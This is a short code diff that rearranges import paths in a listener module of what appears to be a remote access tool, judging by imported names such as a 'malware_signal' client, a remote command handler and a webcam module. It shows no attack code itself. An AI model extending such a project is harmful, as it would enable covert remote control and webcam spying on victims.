@@ -1,7 +1,7 @@
 #command/listen/listener.py
 import asyncio
-from app.core.data import client_id, username
-from app.core.data import ROOM, HOST
+from app.core.data.client import client_id, username
+from app.core.data.config import ROOM, HOST
 from app.malware_signal.signal import SignalClient
 from app.tools.tool_utilities.remote_command_handler import RemoteCommandHandler as ReceiverHandler
 from app.tools.media.web_cam import WebCam
